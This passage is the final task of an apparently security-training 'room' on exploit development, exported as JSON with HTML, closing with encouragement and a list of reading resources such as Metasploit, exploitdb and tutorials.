room to advanced security researching discovering undisclosed and unknown vulnerabilities. As with any skill in life, <b>the more you practice the more proficient you\'ll become</b>. While I\'m new to information security, in my opinion you don\'t need to be a genius to develop exploits. As long as you have patience, research skills, an open mind, diligence and perseverance, you can accomplish any task you set out for. <br /></span></p><p><u><b><span style="font-family:&quot;Arial&quot;;font-size:24px">Resources for exploit development</span></b></u></p><ul><li><span style="font-family:&quot;Arial&quot;">Metasploit resources (module source code, <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom" target="_blank">msfevnom</a>)</span></li><li><span style="font-family:&quot;Arial&quot;">exploitdb (</span><code>searchsploit</code><span style="font-family:&quot;Arial&quot;">), hackerone, 0day, packet storm, secfocus, vulndb, cvedetails, github, vulners<br /></span></li><li><span style="font-family:&quot;Arial&quot;"><a href="https://netsec.ws/?p=262" target="_blank">Converting Metasploit Module to Stand Alone</a></span></li><li><span style="font-family:&quot;Arial&quot;"><a href="https://null-byte.wonderhowto.com/how-to/exploit-development-everything-you-need-know-0167801/" target="_blank">Null-Byte Exploit Development - Everything You Need to Know</a></span></li><li><span style="font-family:&quot;Arial&quot;"><a href="https://github.com/tanc7/hacking-books/blob/master/Violent%20Python%20-%20A%20Cookbook%20for%20Hackers%2C%20Forensic%20Analysts%2C%20Penetration%20Testers%20and%20Security%20Engineers.pdf" target="_blank">Violent Python - </a></span><span style="box-sizing:border-box;color:rgb(36, 41, 46)"><span style="font-family:&quot;Arial&quot;"><a href="https://github.com/tanc7/hacking-books/blob/master/Violent%20Python%20-%20A%20Cookbook%20for%20Hackers%2C%20Forensic%20Analysts%2C%20Penetration%20Testers%20and%20Security%20Engineers.pdf" target="_blank">A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security</a></span></span></li><li><span style="box-sizing:border-box;color:rgb(36, 41, 46)"><span style="font-family:&quot;Arial&quot;"><a href="https://searchsecurity.techtarget.com/definition/proof-of-concept-PoC-exploit" target="_blank">What is a proof of concept exploit?</a><br /></span></span></li></ul><p><span style="font-family:&quot;Arial&quot;">I sincerely hope you found value in this room and I thank you for the time. Good luck with your infosec journey :)</span></p>', 'taskType': 'none', 'taskNo': 7, 'taskCreated': '2020-09-05T04:57:08.918Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Check out some of those links for more reading material.<br />', 'hint': ''}]}]}